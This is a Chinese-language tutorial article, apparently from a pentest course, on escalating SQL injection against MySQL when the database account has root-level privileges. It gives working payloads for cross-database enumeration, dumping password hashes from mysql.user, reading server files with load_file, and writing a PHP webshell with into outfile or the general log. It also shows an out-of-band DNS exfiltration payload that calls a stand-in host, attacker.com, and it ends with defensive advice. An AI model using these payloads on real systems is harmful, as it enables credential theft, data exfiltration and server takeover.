---
title: 第57天-WEB攻防 · SQL注入进阶 高权限场景下的跨库访问、文件操作与带外数据外传
url: https://mp.weixin.qq.com/s/KaeAOR9BTXi2ZgrhFtNnMA
source: Doonsec's feed
date: 2026-02-28
fetch_date: 2026-03-01T04:22:47.572491
---

# 第57天-WEB攻防 · SQL注入进阶 高权限场景下的跨库访问、文件操作与带外数据外传

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Byhdgj3e9quHjia9szwUiaUojibku0XzKxas8icbTB9K5edQeOe3Ye5yphjCrXPDcMqsibdE7MY20UZGLPXiaJOmMTWaoibAgvOwP483L61YHdo2s4/0?wx_fmt=jpeg)

# 第57天-WEB攻防 · SQL注入进阶 高权限场景下的跨库访问、文件操作与带外数据外传

原创

萧瑶
萧瑶

AlphaNet

![]()

在小说阅读器中沉浸阅读

一、从“数据泄露”到“系统接管”：SQL注入的权限分水岭

在  发布的 Top 10 风险列表中，SQL注入长期占据高位。

但真正决定攻击深度的，并不是“是否存在注入”，而是——**数据库账户的权限等级**。

SQL注入本质是：

> 攻击者获得“数据库用户的能力”。

因此问题变成：

* 该数据库用户能访问哪些库？

* 是否拥有 FILE 权限？

* 是否能修改全局变量？

* 是否允许对外网络通信？

当数据库连接账户为 root 或具备高权限时，攻击目标将从“读数据”升级为：

* 跨库窃取敏感信息

* 读写服务器文件

* 写入 WebShell

* 通过带外通道外传数据

* 最终获取服务器控制权

这是一条完整的攻击升级路径。

---

## 二、数据库权限模型的安全边界

### 2.1 数据库的四层结构

数据库逻辑结构可抽象为：

数据库 → 表 → 列 → 数据

MySQL 自带两个关键系统库：

* information\_schema —— 存储数据库元数据

* mysql —— 存储用户权限与认证信息

这两个库，决定了“信息枚举能力”和“权限扩展能力”。

---

### 2.2 关键敏感函数

高权限场景下常见危险函数：

* load\_file() —— 读取服务器文件

* into outfile —— 写入文件

* into dumpfile —— 写入文件（无格式处理）

* user() —— 当前数据库用户

* database() —— 当前数据库名

端口参考：

* MySQL：3306

* SQL Server：1433

* Oracle：1521

---

## 三、SQL注入影响因素的技术分解

SQL注入是否能“进阶利用”，取决于多个变量：

1. 数据库类型差异

   不同数据库权限模型不同，例如 MySQL 支持 FILE 权限，而 SQL Server 可通过 xp\_cmdshell 执行系统命令。

2. 参数数据类型

   数字型与字符型影响闭合方式。

3. 数据编码与格式

   JSON、Base64、加密字段可能隐藏真实注入点。

4. 是否存在数据回显

   无回显场景需使用：

   * 时间盲注

   * 报错注入

   * 带外注入（OOB）

攻击从来不是单一技巧，而是环境判断能力。

---

## 四、高权限场景下的核心利用路径

---

# 4.1 权限识别

第一步永远是确认数据库身份：

```
' and (select user()) like 'root%'#
```

若返回正常，说明数据库连接账户为 root。

在 MySQL 中，root 通常具备：

* 所有数据库访问权限

* FILE 权限

* 全局变量修改权限

这意味着攻击边界几乎消失。

---

# 4.2 跨库数据枚举

当数据库连接账户为 root，可直接跨库访问。

获取数据库列表：

```
' union select schema_name,2,3 from information_schema.schemata#
```

获取指定库的表：

```
' union select table_name,2,3 from information_schema.tables
where table_schema='目标库名'#
```

获取列名：

```
' union select column_name,2,3 from information_schema.columns
where table_name='目标表名'#
```

跨库读取数据：

```
' union select 用户名列,2,3 from 目标库名.目标表名#
```

如果目标网站只使用 news 库，但 root 可访问 mysql 库：

```
' union select concat(user,':',authentication_string),2,3 from mysql.user#
```

MySQL 5.7+ 密码字段为 authentication\_string。

这一步已经是“横向数据突破”。

---

# 4.3 文件读写攻击

这是权限升级的关键点。

---

## 4.3.1 判断文件操作限制

检查 secure\_file\_priv：

```
show variables like "secure_file_priv";
```

三种状态：

* NULL —— 禁止文件操作

* 空值 —— 允许任意路径

* 指定目录 —— 仅允许该目录

---

## 4.3.2 文件读取

```
' union select load_file('d:\\1.txt'),2,3#
```

注意：

* 必须是绝对路径

* Windows 使用双反斜杠

* Linux 使用正斜杠

可读取：

* 网站配置文件

* 中间件配置

* 数据库配置文件

* SSH 密钥文件（若权限允许）

---

## 4.3.3 文件写入

```
' union select '<?php ... ?>',2,3
into outfile 'D:\\phpstudy_pro\\WWW\\shell.php'#
```

写入成功的条件：

* FILE 权限

* 目标路径可写

* 不被 secure\_file\_priv 限制

若 outfile 被限制，可尝试 dumpfile。

---

## 4.3.4 慢查询日志写入技术

若拥有修改全局变量权限：

```
set global general_log = on;
set global general_log_file = 'D:/phpstudy_pro/WWW/test.php';
select 'test';
```

原理：

数据库会把查询语句写入日志文件，从而实现文件写入。

这是一种“间接写入”技巧。

---

# 4.4 带外注入（OOB）

当无回显且时间盲注不稳定时，可以利用数据库发起网络请求。

原理：

使用 load\_file() 访问 UNC 路径：

```
' union select load_file(concat('\\\\',(select database()),
'.attacker.com\\a')),2,3#
```

MySQL 会尝试解析：

\数据库名.attacker.com\a

这会触发 DNS 请求。

攻击者在 DNS 日志中即可看到数据。

这种方式绕过：

* 页面无回显

* 时间限制

* 部分 WAF

它是“通信层绕过”，而不是 SQL 层绕过。

---

## 五、完整攻击链演示

攻击场景：

* 存在注入点

* 数据库用户为 root

* secure\_file\_priv 为空

攻击步骤：

1. 判断权限

2. 获取网站绝对路径

3. 写入文件

4. 连接后门

攻击链逻辑为：

SQL注入

→ 权限确认

→ 跨库枚举

→ 文件写入

→ WebShell

→ 系统控制

这已经从“数据层漏洞”升级为“系统级入侵”。

---

## 六、防御的本质：缩小数据库能力边界

防御并不复杂，但必须严格执行。

1. 禁止应用使用 root 连接数据库

2. 严格限制 FILE 权限

3. 设置 secure\_file\_priv 为 NULL

4. 使用预编译语句（PDO、MyBatis 等）

5. 部署 WAF 作为补充防护

6. 数据库服务器禁止出网，阻断 OOB

真正的安全，是“权限隔离”。

---

## 七、技术总结与思维升级

SQL注入的危险程度，取决于数据库权限。

普通用户注入：

* 数据泄露

高权限注入：

* 横向跨库

* 文件读写

* 外带数据

* 服务器控制

理解这条权限升级链，才算真正掌握 SQL 注入进阶。

渗透测试的核心能力，不是记住 payload，而是：

> 分析环境 → 判断权限 → 选择利用路径 → 构建攻击链

而防御的核心，是从源头上消灭“过度权限”。

当数据库只拥有“它真正需要的能力”时，哪怕出现注入漏洞，攻击面也会被压缩到最小。

这就是权限控制在安全设计中的战略意义。

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/Byhdgj3e9quk3H3M941l5byeiaCLHfZUhoIib5xPSPc8ddSdEOynSxIhaaiaIxwJImQia7wqHZPUerghtNSnbEj87A80CvEm0bGia8Is4qGerIvc/0?wx_fmt=png)

AlphaNet

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/Byhdgj3e9quk3H3M941l5byeiaCLHfZUhoIib5xPSPc8ddSdEOynSxIhaaiaIxwJImQia7wqHZPUerghtNSnbEj87A80CvEm0bGia8Is4qGerIvc/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过